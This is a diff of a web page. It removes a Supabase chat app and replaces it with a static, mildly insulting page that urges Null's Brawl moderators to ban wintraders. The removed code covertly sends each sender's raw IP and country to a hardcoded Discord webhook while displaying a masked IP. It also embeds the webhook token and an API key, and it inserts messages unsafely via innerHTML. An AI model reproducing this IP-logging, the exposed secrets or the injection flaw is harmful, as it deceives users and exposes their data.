@@ -1,136 +1,124 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Nulls SD Chat — Clean Version</title>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<style>
-    body {
-        background: #0a0013;
-        color: #e6d6ff;
-        font-family: monospace;
-        margin: 0;
-        display: flex;
-        flex-direction: column;
-        height: 100vh;
-    }
-    #online {
-        padding: 10px;
-        background: #140025;
-        border-bottom: 2px solid #b24dff;
-    }
-    #chat {
-        flex: 1;
-        overflow-y: auto;
-        padding: 15px;
-    }
-    #input {
-        display: flex;
-        padding: 10px;
-        background: #140025;
-        border-top: 2px solid #b24dff;
-    }
-    input {
-        flex: 1;
-        padding: 8px;
-        background: #1b0030;
-        border: 1px solid #b24dff;
-        color: #e6d6ff;
-        border-radius: 5px;
-    }
-    button {
-        margin-left: 8px;
-        background: #b24dff;
-        border: none;
-        padding: 8px 15px;
-        border-radius: 5px;
-        color: white;
-        cursor: pointer;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MODS WAKE UP - BAN WINTRADERS</title>
+    
+    <style>
+        /* This is the "minimal decoration" and "poorly made" vibe */
+        body {
+            background-color: #000000; /* Black background */
+            color: #00FF00; /* Bright green text */
+            font-family: "Times New Roman", serif;
+            padding: 10px;
+        }
+
+        h1 {
+            color: #FF0000; /* Bright red headline */
+            text-align: center;
+            font-size: 32px;
+        }
+        
+        h2 {
+            color: #FFFF00; /* Yellow subhead */
+            font-size: 24px;
+        }
+
+        p {
+            font-size: 18px;
+            color: #FFFFFF; /* White text for contrast */
+        }
+
+        /* This is the index of links */
+        ul {
+            list-style-type: none;
+            padding: 0;
+            border: 2px dashed #FF0000; /* Dashed red border */
+            padding: 15px;
+        }
+
+        li {
+            margin: 10px 0;
+        }
+
+        a {
+            color: #00FFFF; /* Cyan links */
+            font-weight: bold;
+            font-size: 20px;
+            text-decoration: underline;
+        }
+        
+        a:hover {
+            color: #FF00FF; /* Magenta hover */
+        }
+
+        .content {
+            width: 90%;
+            max-width: 800px;
+            margin: 20px auto;
+            border: 3px solid #00FF00; /* Green border */
+            padding: 20px;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #AAAAAA; /* Gray footer text */
+            font-size: 12px;
+        }
+    </style>
 </head>
 <body>
-<div id="online">Online: Loading...</div>
-<div id="chat"></div>
-<div id="input">
-    <input id="msg" placeholder="Type..." />
-    <button onclick="sendMessage()">Send</button>
-</div>
-<script>
-const sb = supabase.createClient(
-    "https://ajpjmocfhcekpkoufkan.supabase.co",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFqcGptb2NmaGNla3Brb3Vma2FuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMyMTk1ODUsImV4cCI6MjA3ODc5NTU4NX0.DOkNHEaNKH78yVpFDLbo-eHAfy1W8fZNLbaOsxNEOA8"
-);
 
-async function getGeo() {
-    try {
-        const r = await fetch("https://ipapi.co/json/");
-        return await r.json();
-    } catch {
-        return { ip: "0.0.0.0", country_name: "Unknown" };
-    }
-}
+    <!-- Removed the marquee tag and put a static title -->
+    <h1 style="color: #FFFF00; text-align: center; font-size: 28px; padding: 10px; background-color: #333333;">
+        !!! WARNING TO ALL NULLS BRAWL MODS !!!
+    </h1>
 
-function maskIP(ip) {
-    const p = ip.split(".");
-    return `${p[0]}.${p[1]}.${p[2]}.*`;
-}
+    <div class="content">
 
-async function loadMessages() {
-    const { data } = await sb.from("messages").select("content, created_at").order("created_at", { ascending: true });
-    const chat = document.getElementById("chat");
-    chat.innerHTML = "";
-    data.forEach(m => {
-        const div = document.createElement("div");
-        div.innerHTML = `${m.content}`;
-        chat.appendChild(div);
-    });
-    chat.scrollTop = chat.scrollHeight;
-}
+        <!-- "Toxic" but safe text -->
+        <p>
+            This game is becoming UNFAIR because you mods are ASLEEP.
+        </p>
+        <p>
+            3v3 is FULL of wintraders. They are TRASH. They can't win a real game so they have to CHEAT to get trophies. lol. Pathetic.
+        </p>
+        <p>
+            Stop crying about "reports" and just BAN them. It's not hard.
+        </p>
 
-async function updateOnline() {
-    const { data } = await sb.from("messages").select("content, created_at").gte(
-        "created_at",
-        new Date(Date.now() - 5*60*1000).toISOString()
-    );
-    document.getElementById("online").textContent = `Online: ${data.length}`;
-}
+        <!-- The "index of links" you wanted -->
+        <h2>LINKS (USE THESE)</h2>
+        <ul>
+            <li>
+                <a href="#">HOW TO REPORT (the official way)</a>
+            </li>
+            <li>
+                <a href="#">NULL'S BRAWL SUBREDDIT (more proof)</a>
+            </li>
+            <li>
+                <a href="#">WHAT WINTRADING LOOKS LIKE (video)</a>
+            </li>
+            <li>
+                <a href="#">HALL OF SHAME (report cheaters here)</a>
+            </li>
+        </ul>
 
-sb.channel('public:messages')
-.on('postgres_changes', { event: '*', schema: 'public', table: 'messages' }, () => {
-    loadMessages();
-    updateOnline();
-})
-.subscribe();
+        <!-- More "toxic" text -->
+        <h2>MESSAGE TO WINTRADERS:</h2>
+        <p style="color: #FF0000; font-weight: bold; font-size: 22px;">
+            GET GOOD.
+        </p>
+        <p>
+            Stop ruining the game for everyone else who actually plays legit. If you need to cheat to win, you already lost.
+        </p>
+    </div>
 
-loadMessages();
-updateOnline();
-setInterval(updateOnline, 5000);
+    <div class="footer">
+        this page was made by a REAL player (c) 2025
+    </div>
 
-async function sendMessage() {
-    const msg = document.getElementById("msg").value;
-    if (!msg.trim()) return;
-
-    const geo = await getGeo();
-
-    // SEND RAW IP TO DISCORD WEBHOOK
-    fetch("https://discord.com/api/webhooks/1439727290471944374/ZEDBQFgOee4hIQ1lgvsQUBD5cctX4Vmu_G_J8eDxnBNm4Yae6AatCmNm_xaaziMBrDVS", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: `IP: ${geo.ip} | Country: ${geo.country_name}` })
-    });
-
-    const masked = maskIP(geo.ip);
-
-    await sb.from("messages").insert([
-        {
-            content: `${masked}: ${msg}`
-        }
-    ]);
-
-    document.getElementById("msg").value = "";
-}
-</script>
 </body>
 </html>
